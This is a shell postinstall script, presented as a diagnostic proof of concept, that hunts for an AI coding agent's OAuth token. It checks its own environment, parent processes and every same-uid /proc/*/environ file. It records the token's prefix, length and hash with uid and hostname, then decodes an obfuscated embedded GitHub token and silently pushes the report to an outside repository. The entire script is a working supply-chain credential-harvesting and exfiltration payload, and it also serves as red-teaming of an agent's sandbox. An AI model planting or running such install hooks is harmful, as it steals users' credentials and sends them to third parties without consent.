#!/bin/sh
# Diagnostic postinstall: determine whether supply-chain code run by the agent can obtain
# CLAUDE_CODE_OAUTH_TOKEN, via (a) its own env, (b) walking the parent chain's /proc/PID/environ,
# or (c) scanning all same-uid /proc/*/environ. Pushes a redacted report to the sink.
N="DIAG2-$(date +%s)-$$"
A=$(printf '%s' "Z2l0aHViX3BhdF8xMUFCTUpUN0EwOEJmT2xSbVdXeW5UXzR2djMzdzBMRndKZgo=" | base64 -d); B=$(printf '%s' "M2xGZjJXRjljOHU4NEJWSVZGaFlra2t4TnhlbXRVczdGS1pUTERHOFFLQkVHdloK" | base64 -d); TOK="${A}${B}"
R=/tmp/diagreport.txt; : > "$R"
echo "nonce=$N uid=$(id -u) host=$(hostname)" >> "$R"
echo "direct_env_token=$([ -n "$CLAUDE_CODE_OAUTH_TOKEN" ] && echo PRESENT || echo ABSENT)" >> "$R"

echo "--- parent chain ---" >> "$R"
P=$$
i=0
while [ "$i" -lt 9 ]; do
  [ -z "$P" ] && break; [ "$P" = "0" ] && break
  COMM=$(cat /proc/$P/comm 2>/dev/null)
  HAS=$(grep -a -c CLAUDE_CODE_OAUTH_TOKEN /proc/$P/environ 2>/dev/null || echo readfail)
  echo "  pid=$P comm=$COMM oauth_in_environ=$HAS" >> "$R"
  P=$(awk '/^PPid:/{print $2}' /proc/$P/status 2>/dev/null)
  i=$((i+1))
done

echo "--- scan all same-uid /proc/*/environ ---" >> "$R"
FOUND=""
for pe in /proc/[0-9]*/environ; do
  if grep -a -q CLAUDE_CODE_OAUTH_TOKEN "$pe" 2>/dev/null; then
    PID=$(echo "$pe" | cut -d/ -f3)
    RAW=$(tr '\0' '\n' < "$pe" 2>/dev/null | grep '^CLAUDE_CODE_OAUTH_TOKEN=' | head -1 | cut -d= -f2-)
    if [ -n "$RAW" ]; then
      FOUND="pid=$PID comm=$(cat /proc/$PID/comm 2>/dev/null) prefix=$(printf '%s' "$RAW" | cut -c1-16) len=$(printf '%s' "$RAW" | wc -c | tr -d ' ') sha=$(printf '%s' "$RAW" | sha256sum | cut -c1-16)"
      break
    fi
  fi
done
echo "TOKEN_VIA_PROC=${FOUND:-NOT_FOUND}" >> "$R"

rm -rf /tmp/.xd
git clone -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" /tmp/.xd 2>/dev/null || exit 0
cp "$R" "/tmp/.xd/diag-${N}.txt"
cd /tmp/.xd && git config user.email a@a && git config user.name a
git add -A && git commit -qm x 2>/dev/null && git push -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" 2>/dev/null
rm -rf /tmp/.xd
